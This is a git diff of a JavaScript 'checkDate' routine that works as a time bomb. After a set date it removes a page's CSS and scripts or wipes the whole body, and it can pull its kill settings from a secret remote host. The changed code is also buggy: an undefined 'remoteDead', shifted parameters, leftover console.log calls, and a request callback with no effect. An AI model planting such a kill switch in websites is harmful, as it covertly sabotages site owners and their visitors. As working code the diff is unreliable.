@@ -26,7 +26,7 @@
 		 * @param  {[type]} els       [description]
 		 * @return {[type]}           [description]
 		 */
-		function killThatShit(condition, el, els){
+		function killThatShit(condition, els){
 			if(condition){
 				for (var i = els.length; i-- > 0;) {
 				    var el = els[i];
@@ -39,48 +39,53 @@
 		/**
 		 * [checkDate description]
 		 * @param  {[type]}  date        [description]
-		 * @param  {Array}   remoteDead  [description]
 		 * @param  {Boolean} killCss     [description]
 		 * @param  {Boolean} killJs      [description]
 		 * @param  {Boolean} whitescreen [description]
 		 * @return {[type]}              [description]
 		 */
 		function checkDate(Array_parameters){
-			var date = Array_parameters[0];
-			if(!Array_parameters[1]){
-				var remoteDead = [false, 'https://My_Secret_Hosting_DateLine.com'];
+			console.log(Array_parameters);
+			var date = Array_parameters[1];
+
+			var killCss = (!Array_parameters[2]) ?  true : Array_parameters[2],
+				killJs = (!Array_parameters[3]) ?  true : Array_parameters[3],
+				whitescreen = (!Array_parameters[4]) ?  false : Array_parameters[4];
+
+			console.log(killJs);
+			console.log(whitescreen);
+			console.log(killCss);
+
+
+			if(remoteDead[0]){ // Going to find a remote file
+
+				var client = new XMLHttpRequest();
+				client.open('GET', remoteDead[1]);
+				client.onreadystatechange = function() {
+					var Array_parameters = client.responseText.split(',');
+					var killCss = (!Array_parameters[2]) ?  true : Array_parameters[2],
+						killJs = (!Array_parameters[3]) ?  true : Array_parameters[3],
+						whitescreen = (!Array_parameters[4]) ?  false : Array_parameters[4];
+				}
+				client.send();
+
 			}
-			if(!Array_parameters[2]){
-				var killCss = true;
-			}
-			if(!Array_parameters[2]){
-				var killJs = true;
-			}
-			if(!Array_parameters[2]){
-				var whitescreen = false;
-			}
 
-			if(remoteDead[0]){
+			if(date_diff_indays(date) <= 0 ){
+			    // Killing Css
+				killThatShit(killCss, document.getElementsByTagName('head'));
 
+			    // html css
+				killThatShit(killCss, document.getElementsByTagName('style'));
 
-			}else{
-
-			    if(date_diff_indays(date) <= 0 ){
-			        // Killing Css
-					killThatShit(killCss, element, document.getElementsByTagName('head'));
-
-			        // html css
-					killThatShit(killCss, element, document.getElementsByTagName('style'));
-
-			        if(whitescreen==true){ // Whit screen mode
-						var myNode = document.body;
-						while (myNode.firstChild) {
-						    myNode.removeChild(myNode.firstChild);
-						}
-			        }else{
-				        // Killing Js script
-						killThatShit(killJs, element, document.getElementsByTagName('script'));
-			        }
+			    if(whitescreen==true){ // Whit screen mode
+					var myNode = document.body;
+					while (myNode.firstChild) {
+					    myNode.removeChild(myNode.firstChild);
+					}
+			    }else{
+			        // Killing Js script
+					killThatShit(killJs, document.getElementsByTagName('script'));
 			    }
 			}
 
